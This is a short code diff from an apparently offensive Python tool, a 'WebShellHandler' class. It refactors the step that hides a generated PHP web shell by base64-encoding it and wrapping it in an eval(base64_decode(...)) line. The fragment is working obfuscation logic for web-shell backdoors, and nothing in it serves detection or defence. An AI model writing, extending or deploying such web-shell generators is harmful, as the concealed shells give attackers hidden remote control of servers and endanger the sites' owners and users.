@@ -65,7 +65,9 @@ class WebShellHandler:
         
         if obfuscate:
             # Simple obfuscation
-            shell = f"<?php eval(base64_decode('{__import__('base64').b64encode(shell.encode()).decode()}')); ?>"
+            import base64
+            encoded = base64.b64encode(shell.encode()).decode()
+            shell = f"<?php eval(base64_decode('{encoded}')); ?>"
         
         return shell
     
